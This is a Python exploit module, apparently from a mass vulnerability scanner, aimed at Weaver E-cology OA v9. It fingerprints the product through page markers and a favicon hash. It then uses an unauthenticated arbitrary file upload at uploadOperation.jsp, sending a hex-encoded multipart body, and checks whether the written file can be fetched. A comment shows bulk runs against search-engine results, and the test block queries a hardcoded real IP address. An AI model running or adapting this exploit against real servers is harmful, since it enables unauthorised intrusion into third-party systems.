# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 10:51


from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# app="泛微-协同办公OA"
# python3 batch.py -m exploit.scripts.OA.Weaver.E-Weaver.v9.unauth_v9_uploadfile_uploadOperation -cs -fs "app=\"泛微-协同办公OA\""


class Script(BaseScript):
    name = 'E-Weaver'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/page/exportImport/uploadOperation.jsp']
        # 相关信息
        self.info = 'version V9 任意文件上传'
        # favicon_md5
        self.favicon_md5_list = ['41eca7a9245394106a09b2534d8030df']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/'
            async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                if response is not None:
                    await asyncio.sleep(2)
                    text = await response.text()
                    if 'ecology9/js/lib.js' in text or '/wui/common/css/w7ovfont.css' in text or 'typeof poppedwindow' in text or 'client/jquery.client_wev8.js' in text or '/theme/ecology8/jquery/js/zdialog_wev8.js' in text or 'ecology8/lang/weaver_lang_7_wev8.js' in text:
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                    if 'ecology_JSessionId' in response.headers.get('Set_Cookie', ''):
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

            url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
            favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if favicon_md5 in self.favicon_md5_list:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc', 'origin': 'null'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = bytes.fromhex('2D2D2D2D2D2D5765624B6974466F726D426F756E64617279365867796A42365365434172443348630D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2266696C65223B2066696C656E616D653D22726561646D652E747874220D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6F637465742D73747265616D0D0A0D0A746573743132333435360D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279365867796A42365365434172443348632D2D0D0A')
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                url = f'http://{self.target}/page/exportImport/fileTransfer/readme.txt' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/page/exportImport/fileTransfer/readme.txt'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if 'test123456' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
